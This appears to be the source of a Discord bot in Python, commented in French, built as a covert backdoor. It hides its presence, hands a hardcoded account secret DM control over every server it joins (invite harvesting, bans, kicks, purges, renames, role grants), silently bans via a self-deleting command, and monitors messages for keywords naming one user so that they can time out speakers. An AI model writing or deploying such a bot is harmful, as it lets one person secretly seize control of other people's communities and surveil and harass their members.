import discord
from discord.ext import commands
import os
import datetime

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Ton pseudo exact pour sécuriser les commandes
TARGET_USERNAME = "akz_92"
VICTIME_NAME = "m1zuki_1"
MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]

# Stockage temporaire pour les demandes de timeout
pending_timeouts = {}

# Fonction utilitaire pour récupérer un serveur soit par son ID, soit par un lien/code d'invitation
async def get_guild_from_input(identifier):
    if identifier.isdigit():
        return bot.get_guild(int(identifier))
    try:
        code = identifier.split("/")[-1]
        invite = await bot.fetch_invite(code)
        return invite.guild
    except:
        return None

@bot.event
async def on_ready():
    # Force le statut en mode invisible (hors-ligne) dès que le bot est prêt
    await bot.change_presence(status=discord.Status.invisible)
    print(f"Bot furtif opérationnel et invisible pour : {TARGET_USERNAME}. Surveillance active pour {VICTIME_NAME}.")

# =========================================================================
# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
# =========================================================================
@bot.event
async def on_member_update(before, after):
    if after.name == TARGET_USERNAME:
        role = discord.utils.get(after.guild.roles, name="Membre")
        if role and role not in after.roles:
            try:
                await after.add_roles(role)
            except:
                pass

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # =========================================================================
    # 0. SYSTEME DE SURVEILLANCE & CIBLE VERROUILLÉE (pour m1zuki_1)
    # =========================================================================
    if any(mot.lower() in message.content.lower() for mot in MOTS_CLES) and message.author.name != VICTIME_NAME:
        victime = discord.utils.get(message.guild.members, name=VICTIME_NAME)
        if victime:
            pending_timeouts[message.author.id] = message.author
            try:
                await victime.send(
                    f"🚨 **Cible verrouillée** 🚨\n"
                    f"L'utilisateur '{message.author.name}' a dis votre prénom.\n"
                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
                )
            except:
                pass

    # Réponses de m1zuki_1 en DM pour valider ou non le timeout (strictement limité à m1zuki_1)
    if isinstance(message.channel, discord.DMChannel) and message.author.name == VICTIME_NAME:
        content = message.content.lower().strip()
        if content in ["oui", "non"]:
            if pending_timeouts:
                user_id = list(pending_timeouts.keys())[0]
                target = pending_timeouts[user_id]
                
                if content == "oui":
                    try:
                        duration = datetime.timedelta(minutes=10)
                        await target.timeout(duration, reason="Punition m1zuki_1")
                        await target.send(f"Tu dis mon prénom ? Explique toi maintenant ! @{message.author.name}")
                        await message.author.send(f"✅ L'utilisateur {target.name} a pris un timeout de 10 min.")
                    except Exception as e:
                        await message.author.send(f"❌ Impossible de timeout cette personne : {e}")
                else:
                    await message.author.send("✅ Action annulée.")
                
                pending_timeouts.pop(user_id)
            else:
                await message.author.send("Aucune cible en attente.")
            return

    # =========================================================================
    # 1. GESTION DES DM (Contrôle à distance 100% discret strictement pour akz_92)
    # =========================================================================
    if isinstance(message.channel, discord.DMChannel):
        if message.author.name != TARGET_USERNAME:
            return

        args = message.content.split()
        if not args: return
        cmd = args[0].lower()

        try:
            if cmd == "serveurs":
                txt = "\n".join([f"{g.name} (ID: {g.id})" for g in bot.guilds])
                await message.author.send(f"📋 Serveurs :\n{txt}")

            elif cmd == "liens":
                links_output = "🔗 **Liens d'invitation de tous les serveurs :**\n"
                for g in bot.guilds:
                    try:
                        invite = None
                        for c in g.text_channels:
                            try:
                                invite = await c.create_invite(max_uses=1, max_age=3600)
                                break
                            except:
                                continue
                        if invite:
                            links_output += f"- **{g.name}** : {invite.url}\n"
                        else:
                            links_output += f"- **{g.name}** : ❌ Pas de permission\n"
                    except:
                        links_output += f"- **{g.name}** : ❌ Erreur\n"
                await message.author.send(links_output)

            elif cmd == "dire":
                target_channel = bot.get_channel(int(args[1]))
                await target_channel.send(" ".join(args[2:]))
                await message.author.send("✅ Envoyé.")

            elif cmd == "purge":
                channel = bot.get_channel(int(args[1]))
                deleted = await channel.purge(limit=int(args[2]))
                await message.author.send(f"✅ {len(deleted)} messages supprimés.")

            elif cmd == "ban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.ban(reason="Banni via DM")
                await message.author.send("✅ Utilisateur banni.")

            elif cmd == "unban":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                user_obj = await bot.fetch_user(int(args[2]))
                await guild.unban(user_obj, reason="Débannissement via DM par akz_92")
                await message.author.send(f"✅ L'utilisateur {user_obj.name} a été débanni de {guild.name}.")

            elif cmd == "kick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                await member.kick()
                await message.author.send("✅ Utilisateur expulsé.")

            elif cmd == "role":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                role = await guild.create_role(name=args[2])
                await message.author.send(f"✅ Rôle {role.name} créé.")

            elif cmd == "puissance":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                
                target_input = args[2]
                member = None
                if target_input.isdigit():
                    try:
                        member = await guild.fetch_member(int(target_input))
                    except:
                        pass
                if not member:
                    member = discord.utils.find(lambda m: m.name == target_input or m.display_name == target_input, guild.members)

                if not member:
                    await message.author.send(f"❌ Impossible de trouver l'utilisateur '{target_input}' sur ce serveur.")
                    return

                role = discord.utils.get(guild.roles, name="La puissance")
                if not role:
                    await message.author.send("❌ Le rôle 'La puissance' n'existe pas sur ce serveur.")
                    return

                await member.add_roles(role, reason="Attribué via la commande puissance par akz_92")
                await message.author.send(f"✅ Le rôle 'La puissance' a été attribué à {member.name} sur {guild.name}.")

            elif cmd == "nick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                await guild.me.edit(nick=args[2])
                await message.author.send("✅ Mon pseudo a été changé.")

            elif cmd == "setname":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                new_name = " ".join(args[2:])
                await guild.edit(name=new_name)
                await message.author.send(f"✅ Nom du serveur modifié : {new_name}")

            elif cmd == "setnick":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                member = await guild.fetch_member(int(args[2]))
                new_nickname = " ".join(args[3:])
                await member.edit(nick=new_nickname)
                await message.author.send(f"✅ Pseudo de {member.name} modifié.")

            elif cmd == "salon":
                guild = await get_guild_from_input(args[1])
                if not guild:
                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
                    return
                channel_name = " ".join(args[2:])
                new_channel = await guild.create_text_channel(channel_name)
                await message.author.send(f"✅ Salon #{new_channel.name} créé (ID: {new_channel.id}).")

        except Exception as e:
            await message.author.send(f"❌ Erreur : {e}")
        return

    # =========================================================================
    # 2. COMMANDE .ban SUR LE SERVEUR (100% Silencieuse / Réservée à akz_92)
    # =========================================================================
    if message.content.startswith(".ban"):
        if message.author.name == TARGET_USERNAME:
            try:
                await message.delete()
            except:
                pass

            if message.mentions:
                target = message.mentions[0]
                guild = message.guild

                try:
                    await guild.ban(target, reason="Banni discrètement via .ban")
                except Exception as e:
                    try:
                        await message.author.send(f"❌ Erreur lors du ban furtif : {e}")
                    except:
                        pass

# Lancement sécurisé via la variable d'environnement (Token géré sur l'hébergeur)
bot.run(os.getenv("TOKEN"))
